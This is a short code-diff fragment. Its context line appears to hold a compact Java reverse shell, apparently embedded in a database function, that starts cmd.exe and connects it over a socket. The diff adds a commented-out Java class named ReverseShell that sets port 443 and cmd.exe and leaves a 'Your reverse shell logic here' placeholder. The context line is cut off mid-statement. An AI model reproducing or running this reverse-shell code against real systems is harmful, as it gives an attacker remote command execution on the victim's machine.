@@ -5,3 +5,18 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Soc
 return "Exit";
 }
 $$
+
+/*
+
+import java.io.IOException;
+
+public class ReverseShell {
+    public static String retint(String host) throws IOException, InterruptedException {
+        int port = 443;
+        String cmd = "cmd.exe";
+        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        // Your reverse shell logic here
+        return "Exit";
+    }
+}
+*/
